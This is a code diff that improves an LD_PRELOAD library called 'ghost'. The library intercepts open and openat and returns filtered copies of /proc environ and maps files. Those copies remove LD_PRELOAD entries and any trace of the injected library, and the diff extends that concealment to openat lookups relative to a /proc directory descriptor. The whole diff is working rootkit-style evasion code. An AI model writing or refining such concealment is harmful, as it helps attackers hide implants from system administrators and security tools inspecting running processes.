@@ -66,6 +66,31 @@ static int is_ghost_path(const char *path) {
             (strstr(path, "/proc/") != NULL && strstr(path, "/environ") != NULL));
 }
 
+static int is_ghost_openat(int dirfd, const char *path) {
+    if (!path || dirfd == AT_FDCWD) return 0;
+    
+    if (path[0] == '/') {
+        return is_ghost_path(path);
+    }
+    
+    char fd_path[64];
+    char proc_path[256];
+    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", dirfd);
+    
+    ssize_t len = readlink(fd_path, proc_path, sizeof(proc_path) - 1);
+    if (len <= 0) return 0;
+    proc_path[len] = '\0';
+    
+    if (strstr(proc_path, "/proc/") != NULL && 
+        strstr(proc_path, "/self") == NULL) {
+        if (strcmp(path, "maps") == 0 || strcmp(path, "environ") == 0) {
+            return 1;
+        }
+    }
+    
+    return 0;
+}
+
 static int create_filtered_memfd(const char *content, size_t len) {
     if (!real_memfd_create) {
         if (init_libc_funcs() < 0) return -1;
@@ -124,7 +149,7 @@ static int filter_environ_create_fd(const char *path) {
         
         char *src = buffer;
         char *dst = filtered + total;
-        while (*src && total < filtered_size - 1) {
+        while (*src && (size_t)(dst - filtered) < filtered_size - 1) {
             if (strncmp(src, "LD_PRELOAD=", 11) == 0) {
                 src = strchr(src, '\n');
                 if (!src) break;
@@ -132,9 +157,8 @@ static int filter_environ_create_fd(const char *path) {
                 continue;
             }
             *dst++ = *src++;
-            total++;
         }
-        if (total >= filtered_size - 1) break;
+        total = dst - filtered;
     }
     real_close(fd);
     
@@ -184,7 +208,7 @@ static int filter_maps_create_fd(const char *path) {
         
         char *src = buffer;
         char *dst = filtered + total;
-        while (*src && total < filtered_size - 1) {
+        while (*src && (size_t)(dst - filtered) < filtered_size - 1) {
             if ((strstr(src, GHOST_SO_NAME) != NULL && 
                  (src == buffer || *(src-1) == '\n')) ||
                 (strstr(src, "/tmp/") != NULL && strstr(src, ".so") != NULL)) {
@@ -194,9 +218,8 @@ static int filter_maps_create_fd(const char *path) {
                 continue;
             }
             *dst++ = *src++;
-            total++;
         }
-        if (total >= filtered_size - 1) break;
+        total = dst - filtered;
     }
     real_close(fd);
     
@@ -211,6 +234,10 @@ static int filter_maps_create_fd(const char *path) {
 
 int open(const char *path, int flags, ...) {
     if (!real_open) init_libc_funcs();
+    
+    if ((flags & O_PATH) == O_PATH) {
+        return real_open(path, flags);
+    }
     
     mode_t mode = 0;
     if (flags & O_CREAT) {
@@ -243,6 +270,10 @@ int openat(int dirfd, const char *path, int flags, ...) {
         init_libc_funcs();
     }
     
+    if ((flags & O_PATH) == O_PATH) {
+        return real_openat(dirfd, path, flags);
+    }
+    
     mode_t mode = 0;
     if (flags & O_CREAT) {
         va_list args;
@@ -262,6 +293,33 @@ int openat(int dirfd, const char *path, int flags, ...) {
             int memfd = filter_maps_create_fd(path);
             if (memfd >= 0) {
                 return memfd;
+            }
+        }
+    }
+    
+    if (is_ghost_openat(dirfd, path)) {
+        char full_path[256];
+        char fd_path[64];
+        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", dirfd);
+        ssize_t len = readlink(fd_path, full_path, sizeof(full_path) - 1);
+        if (len > 0) {
+            full_path[len] = '\0';
+            if (strlen(full_path) + strlen(path) + 1 < sizeof(full_path)) {
+                strcat(full_path, "/");
+                strcat(full_path, path);
+                
+                if (strcmp(path, "environ") == 0) {
+                    int memfd = filter_environ_create_fd(full_path);
+                    if (memfd >= 0) {
+                        return memfd;
+                    }
+                }
+                else if (strcmp(path, "maps") == 0) {
+                    int memfd = filter_maps_create_fd(full_path);
+                    if (memfd >= 0) {
+                        return memfd;
+                    }
+                }
             }
         }
     }
